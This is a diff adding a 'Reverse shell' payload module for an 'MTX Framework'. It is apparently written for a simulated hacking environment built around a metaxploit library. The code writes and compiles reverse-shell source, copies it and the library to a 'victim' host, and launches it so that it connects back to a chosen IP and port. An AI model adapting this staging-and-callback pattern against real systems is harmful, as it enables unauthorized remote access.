@@ -1,0 +1,31 @@
+// This module requires MTX Framework:   https://github.com/tuonux/mtx
+// Current source:                       https://github.com/tuonux/mtx
+
+MTXPayload                  = get_custom_object.MTXPayload
+MTXPayload.name             = "Reverse shell"
+MTXPayload.description      = "Build a reverse shell and execute it on victim"
+MTXPayload.author           = "tuonux"
+MTXPayload.options["LHOST"] = {"required": 1, "default": "127.0.0.1", "description": "Local IP"}
+MTXPayload.options["LPORT"] = {"required": 1, "default": "1222", "description": "Local port"}
+
+MTXPayload.run = function(remote_object, local_shell, options)
+	if typeof(remote_object) != "shell" then return print_error("Payload works with shell sessions only")
+    old_sessions = metaxploit.rshell_server
+    metaxploit_path = current_path + "/metaxploit.so"
+    if not local_shell.host_computer.File(metaxploit_path) then
+        metaxploit_path = "/lib/metaxploit.so"
+    end if
+    rev_shell_code = "include_lib(current_path + ""/metaxploit.so"").rshell_client("""+options.LHOST+""", "+options.LPORT.to_int+", ""ps"")"
+    print_info("Wrtite reverse shell code")
+    local_shell.host_computer.touch("/home/guest", "rev_shell.src")
+    local_shell.host_computer.File("/home/guest/rev_shell.src").set_content(rev_shell_code)
+    print_info("Build reverse shell")
+    local_shell.build("/home/guest/rev_shell.src", "/home/guest")
+    print_info("Upload metaxploit library to victim")
+    local_shell.scp(metaxploit_path, "/home/guest", remote_object)
+    print_info("Upload reverse shell binary to victim")
+    local_shell.scp("/home/guest/rev_shell", "/home/guest", remote_object)
+    print_info("Launch reverse shell binary on victim")
+    remote_object.launch("/home/guest/rev_shell")
+    return print_good("Reverse shell ready!")
+end function
